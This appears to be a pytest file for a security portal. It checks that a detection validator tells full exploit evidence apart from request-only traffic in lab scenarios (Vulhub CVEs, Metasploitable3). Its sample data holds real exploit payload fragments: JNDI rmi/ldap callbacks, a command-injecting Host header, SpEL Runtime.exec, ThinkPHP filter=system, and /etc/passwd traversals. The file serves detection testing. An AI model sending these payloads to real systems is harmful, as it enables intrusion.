import json
from pathlib import Path

import pytest

from portal.modules.security.core.capture_recipes import (
    CAPTURE_RECIPES,
    render_host_command,
    render_postcondition_command,
    render_recipe_command,
)
from portal.modules.security.core.exec_chain import SCENARIOS
from portal.modules.security.core.siem.capture_enrichment import validate_capture_signals

SAMPLE_EVIDENCE = {
    "vuln_activemq_deserial": "org.springframework.context.support.ClassPathXmlApplicationContext PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success",
    "vuln_fastjson_rce": "com.sun.rowset.JdbcRowSetImpl rmi://10.10.11.50:16668/Exploit PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback",
    "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback",
    "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof",
    "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null) PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof",
    "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec uid=33(www-data) gid=33(www-data)",
    "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom uid=8983(solr) gid=8983(solr)",
    "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
    "vuln_tomcat_deploy": "PUT /portal-proof.jsp/ HTTP/1.1 201 GET /portal-proof.jsp HTTP/1.1 uid=0(root) gid=0(root)",
    "vuln_couchdb_rce": 'PUT /_users/org.couchdb.user:portalproof1 {"roles":["_admin"],"roles":[]} {"ok":true} Authorization: Basic abc GET /_all_dbs ["_users"]',
    "vuln_elasticsearch_rce": "POST /_search?pretty script_fields Runtime.getRuntime().exec uid=0(root) gid=0(root)",
    "vuln_redis_unauth": "INFO server redis_version:4.0.14 CONFIG GET dir /data",
    "vuln_nacos_rce": "User-Agent: Nacos-Server POST /nacos/v1/auth/users username=portalproof1 POST /nacos/v1/auth/users/login username=nacos accessToken=abc",
    "vuln_gitea_rce": "POST /a/b.git/info/lfs/objects ....../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
    "vuln_joomla_rce": 'GET /api/index.php/v1/config/application?public=true {"password":"joomla","db":"joomla"}',
    "vuln_nexus_rce": "GET /%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd root:x:0:0:root:/root:/bin/bash",
    "vuln_django_sqli": "GET /?date=xxxx%27xxxx HTTP/1.1 ProgrammingError: unterminated quoted string",
    "vuln_thinkphp_rce": "POST /index.php?s=captcha _method=__construct&filter%5B%5D=system uid=33(www-data) gid=33(www-data)",
    "vuln_rails_rce": "GET /robots HTTP/1.1 Accept: ../../../../etc/passwd{{ root:x:0:0:root:/root:/bin/bash",
    "vuln_phpmyadmin_rce": "GET /index.php?target=db_sql.php%253f/../../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
    "vuln_nginx_lfi": "GET / Range: bytes=-1217,-9223372036854774591 KEY: http://backend/ HTTP/1.1 200 OK Content-Type: text/html",
    "vuln_zabbix_rce": "GET /jsrpc.php?profileIdx2=updatexml(0,concat(0xa,user()),0) XPATH syntax error: root@localhost",
    "vuln_spring_actuator": "SUBSCRIBE selector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success') SEND /app/hello PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success",
    "vuln_gitlab_rce": "POST /uploads/user AT&TFORM PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof",
    "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof",
    "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120} PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof",
    "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
    "meta3_ftp_backdoor": "USER vagrant PASS vagrant 230 User logged in.",
    "meta3_ssh_brute": "vagrant-2008r2\\vagrant",
    "meta3_winrm_weakpass": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
    "meta3_smb_exploit": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
    "meta3_psexec": "[+] Executed command via wmiexec vagrant-2008r2\\vagrant",
    "meta3_snmp_enum": "public iso.3.6.1.2.1.1.1.0 = STRING: Hardware: Intel64 - Software: Windows Version 6.1 (Build 7601)",
    "meta3_mysql_exploit": "VERSION() 5.5.20-log Database information_schema mysql wordpress",
    "meta3_linux_privesc": "[+] Executed command (shell type: powershell) vagrant-2008r2\\vagrant True",
    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1 Tomcat Web Application Manager nt authority\\system",
    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami nt authority\\system",
    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text nt authority\\local service",
    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1 201 Created nt authority\\local service",
    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php nt authority\\local service",
    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!) script_fields Runtime.getRuntime().exec nt authority\\local service",
}

REQUEST_ONLY_EVIDENCE = {
    "vuln_activemq_deserial": "org.springframework.context.support.ClassPathXmlApplicationContext",
    "vuln_fastjson_rce": "com.sun.rowset.JdbcRowSetImpl rmi://10.10.11.50:16668/Exploit",
    "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit",
    "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt",
    "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null)",
    "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec",
    "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom",
    "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd",
    "vuln_tomcat_deploy": "PUT /portal-proof.jsp/ HTTP/1.1 201 GET /portal-proof.jsp HTTP/1.1",
    "vuln_couchdb_rce": 'PUT /_users/org.couchdb.user:portalproof1 {"roles":["_admin"],"roles":[]}',
    "vuln_elasticsearch_rce": "POST /_search?pretty script_fields Runtime.getRuntime().exec",
    "vuln_redis_unauth": "INFO server CONFIG GET dir",
    "vuln_nacos_rce": "User-Agent: Nacos-Server POST /nacos/v1/auth/users username=portalproof1 POST /nacos/v1/auth/users/login username=nacos",
    "vuln_gitea_rce": "POST /a/b.git/info/lfs/objects ....../../../etc/passwd",
    "vuln_joomla_rce": "GET /api/index.php/v1/config/application?public=true",
    "vuln_nexus_rce": "GET /%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "vuln_django_sqli": "GET /?date=xxxx%27xxxx HTTP/1.1",
    "vuln_thinkphp_rce": "POST /index.php?s=captcha _method=__construct&filter%5B%5D=system",
    "vuln_rails_rce": "GET /robots HTTP/1.1 Accept: ../../../../etc/passwd{{",
    "vuln_phpmyadmin_rce": "GET /index.php?target=db_sql.php%253f/../../../../etc/passwd",
    "vuln_nginx_lfi": "GET / Range: bytes=-1217,-9223372036854774591",
    "vuln_zabbix_rce": "GET /jsrpc.php?profileIdx2=updatexml(0,concat(0xa,user()),0)",
    "vuln_spring_actuator": "SUBSCRIBE selector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success') SEND /app/hello",
    "vuln_gitlab_rce": "POST /uploads/user AT&TFORM",
    "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService",
    "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120}",
    "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes",
    "meta3_ftp_backdoor": "USER vagrant",
    "meta3_ssh_brute": "Warning: Permanently added '10.10.11.10' (ECDSA) to the list of known hosts.",
    "meta3_winrm_weakpass": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
    "meta3_smb_exploit": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
    "meta3_psexec": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
    "meta3_snmp_enum": "Timeout: No Response from 10.10.11.10",
    "meta3_mysql_exploit": "VERSION() 5.5.20-log",
    "meta3_linux_privesc": "vagrant-2008r2\\vagrant",
    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1",
    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami",
    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text",
    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1",
    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php",
    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
}


@pytest.mark.parametrize("scenario", sorted(CAPTURE_RECIPES))
def test_recipe_has_positive_and_request_only_negative_control(scenario):
    positive = validate_capture_signals(scenario, {"network:packet": [SAMPLE_EVIDENCE[scenario]]})
    assert positive["valid"], positive
    assert not positive["unchecked"], positive

    negative = validate_capture_signals(
        scenario, {"network:packet": [REQUEST_ONLY_EVIDENCE[scenario]]}
    )
    assert not negative["valid"], negative


def test_recipes_resolve_runtime_placeholders_and_use_image_contract_tools():
    contract_path = Path(__file__).resolve().parents[4] / "config" / "attack_image_contract.json"
    tools = set(json.loads(contract_path.read_text())["tools"])
    assert {"curl", "date", "grep", "php", "python3", "redis-cli", "sleep"}.issubset(tools)
    for name, recipe in CAPTURE_RECIPES.items():
        assert name in SCENARIOS
        rendered = render_recipe_command(recipe, host="10.10.11.50", port=12345)
        assert "$TARGET_HOST" not in rendered
        assert "$TARGET_PORT" not in rendered
        postcondition = render_postcondition_command(recipe, port=12345, host="10.10.11.50")
        assert "$TARGET_PORT" not in postcondition
        assert "$TARGET_HOST" not in postcondition
        for host_command in (recipe.host_setup_command, recipe.host_cleanup_command):
            rendered_host = render_host_command(host_command, host="10.10.11.50", port=12345)
            assert "$TARGET_HOST" not in rendered_host
            assert "$TARGET_PORT" not in rendered_host


def test_corrected_rce_ground_truth_is_unique_and_matches_observed_behavior():
    assert SCENARIOS["vuln_django_sqli"]["detect_ground_truth"] == ["T1190"]
    assert SCENARIOS["vuln_tomcat_deploy"]["detect_ground_truth"] == [
        "T1190",
        "T1505.003",
        "T1059.004",
    ]
    for name in ("vuln_drupal_rce", "vuln_solr_rce", "vuln_elasticsearch_rce", "vuln_thinkphp_rce"):
        assert "T1059" in SCENARIOS[name]["detect_ground_truth"]
    assert SCENARIOS["vuln_spring_actuator"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_gitlab_rce"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_dubbo_rce"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_shiro_deserial"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_jackson_deserial"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_activemq_deserial"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_laravel_rce"]["detect_ground_truth"] == ["T1190", "T1059"]
    assert SCENARIOS["vuln_wordpress_rce"]["detect_ground_truth"] == ["T1190", "T1059"]
